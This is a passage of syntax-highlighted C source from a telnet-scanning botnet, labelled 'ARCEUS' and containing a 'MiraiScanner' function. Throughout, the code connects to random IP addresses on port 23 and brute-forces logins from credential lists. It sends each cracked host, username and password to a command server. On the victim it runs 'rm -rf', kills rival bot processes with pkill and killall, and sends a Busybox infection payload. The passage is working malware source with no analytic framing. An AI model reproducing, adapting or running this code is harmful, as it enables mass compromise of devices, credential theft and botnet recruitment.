class="line"><span class="keyword">if</span>(fds[i].fd == <span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line">fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(connect(fds[i].fd, (struct sockaddr *)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr)) == <span class="number">-1</span> &amp;&amp; errno != EINPROGRESS) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].complete = <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">1</span>;</span><br><span class="line">fds[i].tTimeout = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">FD_ZERO(&amp;fdset);</span><br><span class="line">FD_SET(fds[i].fd, &amp;fdset);</span><br><span class="line">tv.tv_sec = <span class="number">0</span>;</span><br><span class="line">tv.tv_usec = <span class="number">10000</span>;</span><br><span class="line">res = select(fds[i].fd+<span class="number">1</span>, <span class="literal">NULL</span>, &amp;fdset, <span class="literal">NULL</span>, &amp;tv);</span><br><span class="line"><span class="keyword">if</span>(res == <span class="number">1</span>) &#123;</span><br><span class="line">lon = <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">valopt = <span class="number">0</span>;</span><br><span class="line">getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (<span class="keyword">void</span>*)(&amp;valopt), &amp;lon);</span><br><span class="line"><span class="keyword">if</span>(valopt) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) &amp; (~O_NONBLOCK));</span><br><span class="line">fds[i].tTimeout = <span class="number">0</span>;</span><br><span class="line">fds[i].bufUsed = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(fds[i].sockbuf, <span class="number">0</span>, <span class="number">312</span>);</span><br><span class="line">fds[i].state = <span class="number">2</span>;</span><br><span class="line">&#125; <span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">-1</span>) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">312</span>, phone)) &#123;</span><br><span class="line"><span class="keyword">if</span>(contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">3</span>; &#125;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;admin\r\n&quot;</span>, <span class="number">7</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">312</span>, phone)) &#123;</span><br><span class="line"><span class="keyword">if</span>(contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fds[i].state = <span class="number">5</span>; &#125;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">6</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: &#123;</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;admin\r\n&quot;</span>, <span class="number">7</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].state = <span class="number">6</span>; &#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: &#123;</span><br><span class="line"><span class="keyword">if</span> (read_until_response(fds[i].fd, <span class="number">10000</span>, fds[i].sockbuf, <span class="number">312</span>, advances2)) &#123;</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (contains_fail(fds[i].sockbuf)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sockprintf(mainCommSock, <span class="string">&quot;[ARCEUS] Successfully Bruted. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">								sockprintf(mainCommSock, <span class="string">&quot;DICK %s:%s:%s&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">								fds[i].state = <span class="number">7</span>;</span><br><span class="line">&#125; <span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">if</span> (fds[i].tTimeout + <span class="number">7</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>: &#123;		</span><br><span class="line">				RemoveTempDirs();</span><br><span class="line">				<span class="comment">//sockprintf(mainCommSock, &quot;[ BCM ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">				<span class="comment">//sockprintf(mainCommSock, &quot;[ BCM ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">				</span><br><span class="line">fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(send(fds[i].fd, Busybox_Payload, <span class="built_in">strlen</span>(Busybox_Payload), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">sclose(fds[i].fd);</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>; &#125;</span><br><span class="line">fds[i].complete = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span>(fds[i].tTimeout + <span class="number">60</span> &lt; time(<span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span>(fds[i].complete !=<span class="number">3</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line">fds[i].state = <span class="number">0</span>;</span><br><span class="line">fds[i].complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TelnetScanner</span><span class="params">(<span class="keyword">int</span> wait_usec, <span class="keyword">int</span> maxfds)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max = getdtablesize() - <span class="number">100</span>, i, res, num_tmps, j;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">128</span>], cur_dir;</span><br><span class="line">        <span class="keyword">if</span> (max &gt; maxfds)</span><br><span class="line">                max = maxfds;</span><br><span class="line">        fd_set fdset;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">        <span class="keyword">socklen_t</span> lon;</span><br><span class="line">        <span class="keyword">int</span> valopt;</span><br><span class="line">        <span class="keyword">char</span> line[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">char</span>* buffer;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">        dest_addr.sin_family = AF_INET;</span><br><span class="line">        dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line">        <span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">        buffer = <span class="built_in">malloc</span>(SOCKBUF_SIZE + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, SOCKBUF_SIZE + <span class="number">1</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">telstate_t</span> <span class="title">fds</span>[<span class="title">max</span>];</span></span><br><span class="line">        <span class="built_in">memset</span>(fds, <span class="number">0</span>, max * (<span class="keyword">sizeof</span>(<span class="keyword">int</span>) + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">			fds[i].complete = <span class="number">1</span>;</span><br><span class="line">			fds[i].sockbuf = buffer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(fds[i].tTimeout == <span class="number">0</span>) &#123;</span><br><span class="line">                                fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">switch</span>(fds[i].state) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                &#123;</span><br><span class="line">					<span class="keyword">if</span>(fds[i].complete == <span class="number">1</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">char</span> *tmp = fds[i].sockbuf;</span><br><span class="line">						<span class="built_in">memset</span>(&amp;(fds[i]), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct <span class="keyword">telstate_t</span>));</span><br><span class="line">						fds[i].sockbuf = tmp;</span><br><span class="line">						fds[i].ip = telnetfindARandomIP();</span><br><span class="line">                    &#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span>(fds[i].complete == <span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						fds[i].usernameInd++;</span><br><span class="line">						fds[i].passwordInd++;</span><br><span class="line">						<span class="keyword">if</span>(fds[i].passwordInd == <span class="keyword">sizeof</span>(Telnet_Passwords) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *))</span><br><span class="line">						&#123;</span><br><span class="line">							fds[i].complete = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">continue</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">if</span>(fds[i].usernameInd == <span class="keyword">sizeof</span>(Telnet_Usernames) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *))</span><br><span class="line">						&#123;</span><br><span class="line">							fds[i].complete = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">continue</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					dest_addr.sin_family = AF_INET;</span><br><span class="line">					dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line">					<span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">					dest_addr.sin_addr.s_addr = fds[i].ip;</span><br><span class="line">					fds[i].fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">					<span class="keyword">if</span>(fds[i].fd == <span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line">					fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) | O_NONBLOCK);</span><br><span class="line">					<span class="keyword">if</span>(connect(fds[i].fd, (struct sockaddr *)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr)) == <span class="number">-1</span> &amp;&amp; errno != EINPROGRESS)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						advance_telstate(&amp;fds[i], <span class="number">1</span>);</span><br><span class="line">					&#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					FD_ZERO(&amp;fdset);</span><br><span class="line">					FD_SET(fds[i].fd, &amp;fdset);</span><br><span class="line">					tv.tv_sec = <span class="number">0</span>;</span><br><span class="line">					tv.tv_usec = wait_usec;</span><br><span class="line">					res = select(fds[i].fd+<span class="number">1</span>, <span class="literal">NULL</span>, &amp;fdset, <span class="literal">NULL</span>, &amp;tv);</span><br><span class="line">					<span class="keyword">if</span>(res == <span class="number">1</span>) &#123;</span><br><span class="line">						fds[i].tTimeout = <span class="number">0</span>;</span><br><span class="line">						lon = <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">						valopt = <span class="number">0</span>;</span><br><span class="line">						getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (<span class="keyword">void</span>*)(&amp;valopt), &amp;lon);</span><br><span class="line">						<span class="keyword">if</span>(valopt)</span><br><span class="line">						&#123;</span><br><span class="line">							reset_telstate(&amp;fds[i]);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, <span class="literal">NULL</span>) &amp; (~O_NONBLOCK));</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">2</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">-1</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(fds[i].tTimeout + <span class="number">7</span> &lt; time(<span class="literal">NULL</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))</span><br><span class="line">					&#123;</span><br><span class="line">						fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line">						<span class="keyword">if</span>(contains_fail(fds[i].sockbuf))</span><br><span class="line">						&#123;</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">0</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">3</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(fds[i].tTimeout + <span class="number">7</span> &lt; time(<span class="literal">NULL</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(send(fds[i].fd, Telnet_Usernames[fds[i].usernameInd], <span class="built_in">strlen</span>(Telnet_Usernames[fds[i].usernameInd]), MSG_NOSIGNAL) &lt; <span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					advance_telstate(&amp;fds[i], <span class="number">4</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))</span><br><span class="line">					&#123;</span><br><span class="line">						fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line">						<span class="keyword">if</span>(contains_fail(fds[i].sockbuf))</span><br><span class="line">						&#123;</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">0</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">5</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(fds[i].tTimeout + <span class="number">7</span> &lt; time(<span class="literal">NULL</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;								</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(send(fds[i].fd, Telnet_Passwords[fds[i].passwordInd], <span class="built_in">strlen</span>(Telnet_Passwords[fds[i].passwordInd]), MSG_NOSIGNAL) &lt; <span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					advance_telstate(&amp;fds[i], <span class="number">6</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;									</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2)) </span><br><span class="line">					&#123;</span><br><span class="line">						fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line">						<span class="keyword">if</span>(contains_fail(fds[i].sockbuf))</span><br><span class="line">						&#123;</span><br><span class="line">							advance_telstate(&amp;fds[i], <span class="number">0</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span> <span class="keyword">if</span>(contains_success(fds[i].sockbuf))</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">if</span>(fds[i].complete == <span class="number">2</span>)</span><br><span class="line">							&#123;</span><br><span class="line">								advance_telstate(&amp;fds[i], <span class="number">7</span>);</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">							&#123;</span><br><span class="line">								sockprintf(mainCommSock, <span class="string">&quot;\x1b[0;31m[ARCEUS] Successfully Bruted IP: \x1b[0;33m%s\x1b[0;31m Port: \x1b[0;33m23 \x1b[0;31mUsername: \x1b[0;33m%s \x1b[0;31mPassword: \x1b[0;33m%s\x1b[0;37m&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">								sockprintf(mainCommSock, <span class="string">&quot;DICK %s:%s:%s&quot;</span>, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span><br><span class="line">								advance_telstate(&amp;fds[i], <span class="number">7</span>);</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							reset_telstate(&amp;fds[i]);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(fds[i].tTimeout + <span class="number">7</span> &lt; time(<span class="literal">NULL</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						reset_telstate(&amp;fds[i]);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">char</span> RemoveTheTempDirs [<span class="number">80</span>];</span><br><span class="line">				<span class="built_in">sprintf</span>(RemoveTheTempDirs, <span class="string">&quot;rm -rf %s;&quot;</span>, Temp_Directorys);</span><br><span class="line">				<span class="keyword">if</span>(send(fds[i].fd, RemoveTheTempDirs, <span class="built_in">strlen</span>(RemoveTheTempDirs), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123; reset_telstate(&amp;fds[i]);<span class="keyword">continue</span>; &#125;</span><br><span class="line">				RemoveTempDirs();</span><br><span class="line">				<span class="comment">//sockprintf(mainCommSock, &quot;[ TELNET ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">				<span class="keyword">char</span> killtheproccesses[<span class="number">80</span>];</span><br><span class="line">				<span class="built_in">sprintf</span>(killtheproccesses, <span class="string">&quot;pkill -9 %s;killall -9 %s;&quot;</span>, Bot_Killer_Binarys, Bot_Killer_Binarys);</span><br><span class="line">				<span class="keyword">if</span>(send(fds[i].fd, killtheproccesses, <span class="built_in">strlen</span>(killtheproccesses), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123; reset_telstate(&amp;fds[i]);<span class="keyword">continue</span>; &#125;</span><br><span class="line">				<span class="comment">//sockprintf(mainCommSock, &quot;[ TELNET ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">				advance_telstate(&amp;fds[i], <span class="number">8</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">				&#123;</span><br><span class="line">						fds[i].tTimeout = time(<span class="literal">NULL</span>);</span><br><span class="line">						<span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;sh\r\n&quot;</span>, <span class="number">4</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>);</span><br><span class="line">						<span class="keyword">if</span>(send(fds[i].fd, <span class="string">&quot;shell\r\n&quot;</span>, <span class="number">7</span>, MSG_NOSIGNAL) &lt; <span class="number">0</span>);</span><br><span class="line">                        <span class="keyword">if</span>(send(fds[i].fd, Busybox_Payload, <span class="built_in">strlen</span>(Busybox_Payload), MSG_NOSIGNAL) &lt; <span class="number">0</span>) &#123; reset_telstate(&amp;fds[i]);<span class="keyword">continue</span>; &#125;</span><br><span class="line">						<span class="comment">//sockprintf(mainCommSock, &quot;[ TELNET ] Sending Infection Payload. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">						<span class="keyword">if</span>(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, <span class="string">&quot;CONNECTED&quot;</span>))</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">if</span>(strcasestr(fds[i].sockbuf, <span class="string">&quot;CONNECTED&quot;</span>) &amp;&amp; fds[i].complete != <span class="number">3</span>)</span><br><span class="line">							&#123;</span><br><span class="line">								<span class="comment">//sockprintf(mainCommSock, &quot;[ TELNET ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s&quot;, inet_ntoa(*(struct in_addr *)&amp;(fds[i].ip)), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">								fds[i].complete = <span class="number">3</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">if</span>(fds[i].tTimeout + <span class="number">10</span> &lt; time(<span class="literal">NULL</span>))</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">if</span>(fds[i].complete!=<span class="number">3</span>)</span><br><span class="line">							&#123;</span><br><span class="line">								<span class="comment">//sockprintf(mainCommSock, &quot;[ TELNET ] Infection Failed. || IP: %s || Port: 23 || Username: %s || Password: %s&quot;, get_telstate_host(&amp;fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);</span></span><br><span class="line">							&#125;</span><br><span class="line">                            reset_telstate(&amp;fds[i]);</span><br><span class="line">                        &#125;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;				</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MiraiScanner</span><span class="params">(<span class="keyword">int</span> wait_usec, <span class="keyword">int</span> maxfds)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max = getdtablesize() - <span class="number">100</span>, i, res, num_tmps, j;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">128</span>], cur_dir;</span><br><span class="line">        <span class="keyword">if</span> (max &gt; maxfds)</span><br><span class="line">                max = maxfds;</span><br><span class="line">        fd_set fdset;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">        <span class="keyword">socklen_t</span> lon;</span><br><span class="line">        <span class="keyword">int</span> valopt;</span><br><span class="line">        <span class="keyword">char</span> line[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">char</span>* buffer;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">        dest_addr.sin_family = AF_INET;</span><br><span class="line">        dest_addr.sin_port = htons(<span class="number">23</span>);</span><br><span class="line">        <span class="built_in">memset</span>(dest_addr.sin_zero, <span 